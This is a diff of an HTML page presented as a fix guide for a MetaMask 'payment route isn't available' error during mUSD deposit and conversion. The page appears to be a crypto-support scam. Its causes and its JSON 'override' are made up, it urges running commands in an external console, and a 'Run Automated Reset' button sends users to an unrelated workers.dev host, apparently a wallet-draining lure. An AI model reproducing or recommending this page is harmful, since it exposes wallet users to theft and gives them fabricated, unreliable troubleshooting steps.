@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -46,32 +46,29 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch in the payment routing configuration within the Metamask extension, preventing the successful execution of the deposit and conversion process.</li>
+<li>The error occurs due to a temporary limitation or restriction in the payment routing system, often caused by liquidity issues or maintenance on the underlying protocols.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to restart the Metamask extension and retry the transaction.</li>
-<li>Check for any available updates for the Metamask extension and install the latest version.</li>
-<li>Utilize the following configuration override:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Check the Metamask extension for any available updates and install the latest version.</li>
+<li>Verify that the mUSD token is properly configured and added to the Metamask wallet.</li>
+<li>Use the following JSON configuration to manually override the payment route:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;paymentRoutes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;mUSD&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;priority&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;alternative&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...mUSD_token_address...&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to diagnose and resolve the issue.</p>
+<p>Consider utilizing an external console to execute commands for more advanced troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Sufficient ETH balance for transaction fees.</li>
-<li>Stable internet connection for seamless transaction processing.</li>
+<li>Metamask extension installed and configured</li>
+<li>mUSD token added to the Metamask wallet</li>
+<li>Sufficient ETH balance for transaction fees</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
